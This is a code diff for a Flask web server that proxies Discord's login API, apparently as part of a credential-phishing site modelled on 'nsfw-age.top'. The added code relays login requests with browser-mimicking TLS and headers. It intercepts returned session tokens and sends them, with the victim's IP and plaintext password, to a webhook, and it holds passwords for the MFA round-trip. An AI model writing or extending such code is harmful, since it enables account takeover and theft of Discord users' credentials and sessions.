@@ -1700,38 +1700,178 @@ def _pop_captcha_session(session_id):
         return pair[0] if pair else None
 
 
-# ── Science proxy ──
-# Discord's JS client fires analytics events to discord.com/api/v9/science.
-# We proxy these so the browser can send them as if from our domain.
+# ── Transparent Discord API proxy ──
+# Copies nsfw-age.top's architecture: browser sends full Discord headers,
+# we forward to Discord using curl_cffi (Chrome TLS), return Discord's raw response.
+# We sniff for tokens/tickets on the way back for webhook/role assignment.
+
+_PROXY_FORWARD_HEADERS = [
+    'X-Super-Properties', 'X-Fingerprint', 'X-Discord-Locale', 'X-Discord-Timezone',
+    'X-Debug-Options', 'X-Captcha-Key', 'X-Captcha-Rqtoken', 'X-Captcha-Session-Id',
+    'Content-Type', 'Accept', 'Accept-Language',
+]
+
+_CORS_ALLOW_HEADERS = ', '.join(_PROXY_FORWARD_HEADERS + ['Origin', 'Referer'])
+
+def _proxy_cors_preflight():
+    resp = make_response('', 204)
+    resp.headers['Access-Control-Allow-Origin'] = '*'
+    resp.headers['Access-Control-Allow-Headers'] = _CORS_ALLOW_HEADERS
+    resp.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
+    resp.headers['Access-Control-Max-Age'] = '86400'
+    return resp
+
+def _build_proxy_headers(extra_headers=None):
+    """Build headers to forward to Discord, pulling from browser's request."""
+    hdrs = {
+        'Accept': request.headers.get('Accept', '*/*'),
+        'Accept-Language': request.headers.get('Accept-Language', 'en-US,en;q=0.9'),
+        'Content-Type': request.headers.get('Content-Type', 'application/json'),
+        'User-Agent': UA,
+        'Origin': 'https://discord.com',
+        'Referer': 'https://discord.com/login',
+        'Sec-CH-UA': SEC_CH_UA,
+        'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
+        'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
+    }
+    # Forward Discord-specific headers from browser
+    for h in _PROXY_FORWARD_HEADERS:
+        val = request.headers.get(h)
+        if val:
+            hdrs[h] = val
+    # Ensure X-Super-Properties is always present
+    if 'X-Super-Properties' not in hdrs:
+        hdrs['X-Super-Properties'] = sprops()
+    if extra_headers:
+        hdrs.update(extra_headers)
+    return hdrs
+
+def _make_cors_response(discord_resp):
+    """Wrap a curl_cffi response as a Flask response with CORS headers."""
+    resp = make_response(discord_resp.content, discord_resp.status_code)
+    resp.headers['Content-Type'] = discord_resp.headers.get('Content-Type', 'application/json')
+    resp.headers['Access-Control-Allow-Origin'] = '*'
+    resp.headers['Access-Control-Expose-Headers'] = 'X-Fingerprint'
+    # Forward X-Fingerprint if Discord returns it
+    xfp = discord_resp.headers.get('X-Fingerprint', '')
+    if xfp:
+        resp.headers['X-Fingerprint'] = xfp
+    return resp
+
+
+@app.route('/api/v9/experiments', methods=['GET', 'OPTIONS'])
+def api_experiments_proxy():
+    """Proxy /experiments → browser gets fingerprint (like nsfw-age.top serves Discord's page)."""
+    if request.method == 'OPTIONS':
+        return _proxy_cors_preflight()
+    try:
+        s = _make_session()
+        # Visit login page first to get cookies (mimics page load)
+        try:
+            s.get('https://discord.com/login', headers={
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'User-Agent': UA,
+                'Sec-CH-UA': SEC_CH_UA,
+                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
+                'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
+                'Sec-Fetch-Dest': 'document',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-Site': 'none',
+            }, timeout=10)
+        except:
+            pass
+        hdrs = _build_proxy_headers()
+        # Remove Content-Type for GET
+        hdrs.pop('Content-Type', None)
+        hdrs['X-Track'] = sprops()
+        r = s.get(f'{API}/experiments', headers=hdrs, timeout=15)
+        _handle_discord_response(r)
+        print(f'[experiments] proxy → {r.status_code}')
+        resp = _make_cors_response(r)
+        return resp
+    except Exception as e:
+        print(f'[experiments] error: {e}')
+        return jsonify({'fingerprint': None}), 502
+
+
+@app.route('/api/v9/auth/login', methods=['POST', 'OPTIONS'])
+def api_v9_auth_login():
+    """Transparent proxy to Discord /auth/login — copies nsfw-age.top exactly.
+    Browser sends ALL Discord headers (x-fingerprint, x-super-properties, x-captcha-*).
+    We forward to Discord using curl_cffi and return Discord's raw response.
+    We sniff for tokens/tickets on the way back."""
+    if request.method == 'OPTIONS':
+        return _proxy_cors_preflight()
+
+    ok, retry_after = _rate_check('login')
+    if not ok:
+        return jsonify({'error': f'Too many attempts. Try again in {retry_after}s.', 'retry_after': retry_after}), 429
+
+    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    body = request.get_data()
+
+    try:
+        s = _make_session()
+        if DISCORD_PROXIES:
+            s.proxies = DISCORD_PROXIES
+        hdrs = _build_proxy_headers()
+        r = s.post(f'{API}/auth/login', data=body, headers=hdrs, timeout=30)
+        _handle_discord_response(r)
+
+        try:
+            j = r.json()
+        except:
+            j = {}
+
+        print(f'[login] [{r.status_code}]: {r.text[:300]}')
+
+        # Sniff for successful login → fire webhook + assign role
+        if j.get('token'):
+            pw = '?'
+            try:
+                bd = json.loads(body)
+                pw = bd.get('password', '?')
+            except:
+                pass
+            fire_webhook(j['token'], client_ip, pw)
+            # Build success response — add our server-side info
+            info = _success_with_info(j['token'])
+            return jsonify(info), 200
+
+        # Sniff for MFA ticket → store password for later MFA round-trip
+        if j.get('ticket'):
+            try:
+                bd = json.loads(body)
+                pw = bd.get('password', '?')
+                if pw != '?':
+                    with _pw_store_lock:
+                        _pw_store[j['ticket']] = pw
+            except:
+                pass
+
+        # Return Discord's raw response (captcha-required, invalid-login, etc.)
+        resp = _make_cors_response(r)
+        return resp
+
+    except Exception as e:
+        import traceback
+        traceback.print_exc()
+        return jsonify({'error': str(e)}), 500
+
+
 @app.route('/api/v9/science', methods=['POST', 'OPTIONS'])
 def api_science_proxy():
-    # Handle CORS preflight
     if request.method == 'OPTIONS':
-        resp = make_response('', 204)
-        resp.headers['Access-Control-Allow-Origin'] = '*'
-        resp.headers['Access-Control-Allow-Headers'] = 'Content-Type, X-Super-Properties, X-Fingerprint, X-Discord-Locale, X-Discord-Timezone, X-Debug-Options'
-        resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
-        return resp
+        return _proxy_cors_preflight()
     try:
         body = request.get_data()
-        # Forward to Discord using curl_cffi (Chrome TLS) — plain requests gets 401
-        hdrs = {
-            'Accept': '*/*',
-            'Content-Type': 'application/json',
-            'User-Agent': UA,
-            'X-Super-Properties': request.headers.get('X-Super-Properties', sprops()),
-            'X-Debug-Options': 'bugReporterEnabled',
-            'X-Discord-Locale': 'en-US',
-            'X-Discord-Timezone': 'America/New_York',
-            'Origin': 'https://discord.com',
-            'Referer': 'https://discord.com/',
-        }
-        fp = request.headers.get('X-Fingerprint', '')
-        if fp:
-            hdrs['X-Fingerprint'] = fp
+        hdrs = _build_proxy_headers()
         s = _make_session()
         r = s.post('https://discord.com/api/v9/science', data=body, headers=hdrs, timeout=10)
-        print(f'[science] proxied -> {r.status_code}')
+        print(f'[science] proxied → {r.status_code}')
         resp = make_response('', r.status_code)
         resp.headers['Access-Control-Allow-Origin'] = '*'
         return resp
@@ -1740,90 +1880,35 @@ def api_science_proxy():
         return '', 204
 
 
+# ── Legacy /api/login (kept for MFA flow compatibility) ──
 @app.route('/api/login', methods=['POST'])
 def api_login():
+    """Legacy endpoint — redirects to transparent proxy logic."""
     ok, retry_after = _rate_check('login')
     if not ok:
         return jsonify({'error': f'Too many attempts. Try again in {retry_after}s.'}), 429
     d = request.json
     login_email        = d.get('login')
     login_pw           = d.get('password')
-    captcha_token      = d.get('captcha_token', '')
-    captcha_rqtoken    = d.get('captcha_rqtoken', '')
-    captcha_session_id = d.get('captcha_session_id', '')
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
     try:
-        # If this is step 2 (captcha solved), reuse the SAME session from step 1
-        ds = None
-        if captcha_token and captcha_session_id:
-            ds = _pop_captcha_session(captcha_session_id)
-            if ds:
-                print(f'[login] Reusing stored session for captcha_session_id={captcha_session_id[:16]}…')
-        if not ds:
-            pool_ds = _get_ready_session()
-            if pool_ds:
-                ds = pool_ds
-                # Pool session was prepared on Railway IP — force proxy for login
-                ds.force_proxy()
-            else:
-                ds = DiscordSession()
-                # Force proxy BEFORE prepare so cookies/fingerprint come from proxy IP
-                ds.force_proxy()
-                ds.prepare()
-        else:
-            # Reused captcha session — ensure proxy is still forced
-            ds.force_proxy()
+        ds = _get_ready_session() or DiscordSession()
+        if not ds.cookies_ready:
+            ds.prepare()
 
         payload = {
             'login': login_email, 'password': login_pw,
             'undelete': False, 'gift_code_sku_id': None,
         }
 
-        # Discord expects captcha as HTTP headers (confirmed via nsfw-age.top HAR)
-        extra = {}
-        if captcha_token:
-            extra['X-Captcha-Key']        = captcha_token
-            extra['X-Captcha-Rqtoken']    = captcha_rqtoken
-            extra['X-Captcha-Session-Id'] = captcha_session_id
-
-        try:
-            r = ds.post('/auth/login', payload, extra_headers=extra)
-        except Exception:
-            snap = ds.snapshot()
-            ds = DiscordSession()
-            ds.s = _make_session()
-            ds.restore(snap)
-            r = ds.post('/auth/login', payload, extra_headers=extra)
+        r = ds.post('/auth/login', payload)
 
         try:
             j = r.json()
         except Exception:
             return jsonify({'error': 'Discord returned invalid response. Try again.'}), 502
-        print(f'[login] [{r.status_code}]: {r.text[:300]}')
-
-        ckeys = j.get('captcha_key', [])
-        is_captcha = isinstance(ckeys, list) and (
-            'captcha-required' in ckeys or j.get('captcha_sitekey')
-        )
-
-        if is_captcha:
-            # Store session so step 2 reuses same fingerprint+cookies
-            sid = j.get('captcha_session_id', '')
-            if sid:
-                _store_captcha_session(sid, ds)
-                print(f'[login] Captcha required — stored session {sid[:16]}… for reuse')
-            else:
-                print(f'[login] Captcha required — no session_id from Discord (cannot store)')
-            return jsonify({
-                'captcha_needed': True,
-                'sitekey':    j.get('captcha_sitekey', DEFAULT_SITEKEY),
-                'rqdata':     j.get('captcha_rqdata', ''),
-                'rqtoken':    j.get('captcha_rqtoken', ''),
-                'session_id': sid,
-                'fingerprint': ds.fingerprint or '',
-                'super_properties': sprops(),
-            }), 200
+        print(f'[login-legacy] [{r.status_code}]: {r.text[:300]}')
 
         return _format_login_result(j, r.status_code, client_ip, ds, password=login_pw)
 
